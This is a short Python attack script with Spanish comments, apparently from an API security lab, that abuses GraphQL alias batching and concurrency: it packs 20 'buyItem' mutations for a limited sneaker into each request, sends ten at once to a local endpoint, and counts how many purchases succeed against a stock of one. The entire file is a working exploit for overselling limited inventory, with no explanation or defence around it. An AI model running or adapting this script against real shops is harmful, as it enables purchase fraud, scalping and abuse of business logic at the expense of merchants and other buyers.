import asyncio
import httpx
import time

async def exploit_api6():
    # 20 intentos de compra por cada petición HTTP (Batching Abuse)
    ALIAS_COUNT = 20 
    query_parts = [f"a{i}: buyItem(itemId: \"SNEAKER_LIMITED\")" for i in range(ALIAS_COUNT)]
    query = "mutation {\n  " + "\n  ".join(query_parts) + "\n}"
    
    url = "http://127.0.0.1:8000/graphql"
    print(f"[*] Lanzando ataque masivo contra {url}...")
    
    async with httpx.AsyncClient() as client:
        # Lanzamos 10 peticiones concurrentes (Total 200 operaciones)
        tasks = [client.post(url, json={"query": query}, timeout=30.0) for _ in range(10)]
        
        start_time = time.time()
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()

    print(f"\n[+] Ataque finalizado en {end_time - start_time:.2f}s")
    
    success_count = 0
    for r in responses:
        if isinstance(r, Exception): continue
        data = r.json()
        for alias, msg in data.get("data", {}).items():
            if "EXITO" in msg:
                success_count += 1
                print(f"[VULNERADO] {alias}: {msg}")
    
    print(f"\n[!] TOTAL DE COMPRAS EXITOSAS: {success_count} (Stock inicial era 1)")

if __name__ == "__main__":
    asyncio.run(exploit_api6())
